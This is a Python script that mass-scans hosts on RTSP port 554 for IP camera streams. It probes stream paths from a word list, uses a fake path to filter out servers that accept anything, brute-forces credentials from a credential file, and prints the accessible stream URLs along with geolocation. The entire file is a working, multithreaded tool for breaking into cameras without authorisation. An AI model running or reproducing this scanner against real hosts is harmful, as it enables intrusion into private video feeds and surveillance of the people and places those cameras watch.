#!/usr/bin/env python
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
from pathlib import Path
import re
from socket import SOL_SOCKET, SO_BINDTODEVICE, SocketIO, create_connection, timeout
from subprocess import Popen
from time import sleep

from fire import Fire
from tqdm import tqdm

from lib.utils import geoip_str_online


fake_path = '/f4k3p4th'
work_dir = Path(os.path.dirname(os.path.abspath(__file__)))

data_dir = work_dir / 'data'
local_dir = work_dir / 'local'

paths_file = data_dir / 'rtsp_paths.txt'
creds_file = data_dir / 'rtsp_creds.txt'

paths = [fake_path] + [ln.rstrip() for ln in open(paths_file)]
creds = [ln.rstrip() for ln in open(creds_file)]

header_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')


def query(connection, url):
    request = (
        f'DESCRIBE {url} RTSP/1.0\r\n'
        'CSeq: 2\r\n'
        '\r\n'
    )

    try:
        connection.sendall(request.encode())
        response = connection.recv(1024).decode()
        header_matches = header_re.findall(response)
        if header_matches:
            return int(header_matches[0])
    except KeyboardInterrupt:
        raise
    except BrokenPipeError:
        pass
    except timeout:
        pass
    except ConnectionResetError:
        pass
    except UnicodeDecodeError:
        pass
    except Exception as e:
        print(repr(e))
        pass

    return 500


def get_url(host, port=554, path='', cred=''):
    if cred:
        cred = f'{cred}@'
    return f'rtsp://{cred}{host}:{port}{path}'


def connect(host, port, interface) -> SocketIO:
    retries = 3
    while retries:
        try:
            c = create_connection((host, int(port)), 3)
            if interface:
                c.setsockopt(SOL_SOCKET, SO_BINDTODEVICE, interface.encode())
            return c
        except KeyboardInterrupt:
            raise
        except:
            sleep(1.5/retries)
            retries -= 1


def process_callback(callback, host, url):
    Popen([callback, url, geoip_str_online(host)])


def process_target(target_params):
    host, port, single_path, interface, callback = target_params
    connection = connect(host, port, interface)

    results = []

    if not connection:
        return results  # next host

    for path in paths:
        p_url = get_url(host, port, path)
        code = query(connection, p_url)

        if code >= 500:
            connection.close()
            return results  # first request fail, cant continue

        if code not in [200, 401, 403]:
            continue

        if path == fake_path:
            break

        if code == 200:
            results.append(p_url)
            if callback:
                process_callback(callback, host, p_url)
            if single_path:
                connection.close()
                return results
            continue

        for cred in creds:
            c_url = get_url(host, port, path, cred)
            code = query(connection, c_url)
            if code >= 500:
                connection.close()
                return results  # something goes wrong =(

            if code != 200:
                continue  # access denied

            results.append(c_url)
            if callback:
                process_callback(callback, host, c_url)
            if single_path:
                connection.close()
                return results
            break  # one cred per path is enough

    connection.close()
    return results


def main(H='', w=None, sp=False, i='', cb=''):
    hosts_file = H or local_dir / 'hosts_554.txt'

    with ThreadPoolExecutor(w) as ex:
        with open(hosts_file) as hf:
            futures = {}

            for ln in hf:
                host = ln.rstrip()
                port = 554

                if ':' in host:
                    host, port = host.split(':')

                arg = (host, port, sp, i, cb)

                future = ex.submit(process_target, arg)
                futures[future] = arg

            results = []

            with tqdm(total=len(futures)) as pb:
                for future in as_completed(futures):
                    host, port, *_ = futures[future]
                    res = future.result()
                    pb.update()
                    for r in res:
                        results.append(r)

            for r in results:
                print(r)


if __name__ == "__main__":
    try:
        Fire(main)
    except KeyboardInterrupt:
        print('Interrupted by user')
        exit(130)
